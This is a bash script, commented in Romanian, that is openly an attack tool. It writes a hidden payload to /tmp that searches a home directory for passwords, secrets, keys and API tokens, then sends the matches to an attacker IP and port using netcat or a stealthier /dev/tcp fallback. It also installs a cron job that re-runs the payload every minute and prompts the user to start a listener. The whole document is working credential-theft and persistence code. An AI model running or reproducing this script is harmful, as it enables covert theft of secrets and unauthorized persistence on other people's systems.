#!/bin/bash

#Acest script se va adăuga singur în crontab pentru a rula în fiecare minut. Sarcina lui este să caute fișiere care conțin cuvinte cheie sensibile (ex: "password", "confidential") și să le logheze într-un fișier ascuns.


#!/bin/bash

# Configurația Atacatorului (Listener)
ATTACKER_IP="192.168.12.5"
ATTACKER_PORT="4444"

# 1. Definirea payload-ului
PAYLOAD_PATH="/tmp/.system_maintenance.sh"

cat << EOF > $PAYLOAD_PATH
#!/bin/bash
# Simulează scanarea după date sensibile
SEARCH_DIR="/home/support_account" 

# Fiser temporar pentru rezultate
TEMP_FILE="/tmp/.temp_scan"

# "Scanare" de date (grep recursiv)
# Caută string-uri specifice
grep -rE --exclude-dir={.cache,.local,.npm,.mozilla} "password|secret|key|api_token" "\$SEARCH_DIR" > \$TEMP_FILE 2>/dev/null

# Dacă găsește ceva, trimite datele prin rețea
if [ -s \$TEMP_FILE ]; then
    # Metoda 1: Încearcă Netcat (nc)
    if command -v nc >/dev/null; then
        cat \$TEMP_FILE | nc -w 60 $ATTACKER_IP $ATTACKER_PORT
    else
        # Metoda 2: Fallback la Bash /dev/tcp (Living off the Land)
        # Aceasta metodă este mai 'stealthy' deoarece nu apare procesul 'nc'
        cat \$TEMP_FILE > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT
    fi
    
    # Șterge urma temporară
    rm \$TEMP_FILE
fi
EOF

# Facem payload-ul executabil
chmod +x $PAYLOAD_PATH

# 2. Instalarea Persistenței (Cronjob Injection)
echo "[*] Injecting malicious cron job..."

# Backup la crontab-ul curent
crontab -l > /tmp/cron_backup.txt 2>/dev/null

# Adăugăm job-ul nostru: Rulează la fiecare minut
(crontab -l 2>/dev/null; echo "* * * * * $PAYLOAD_PATH") | crontab -

echo "[*] Cron job installed targeting $ATTACKER_IP:$ATTACKER_PORT"
echo "[*] Don't forget to start your listener: nc -lvnp $ATTACKER_PORT"

#### Restaurează backup-ul sau șterge manual linia
#crontab -r  # Atenție: Șterge TOATE cronjob-urile utilizatorului!
#rm /tmp/.system_maintenance.sh
#rm /tmp/.scan_results.enc
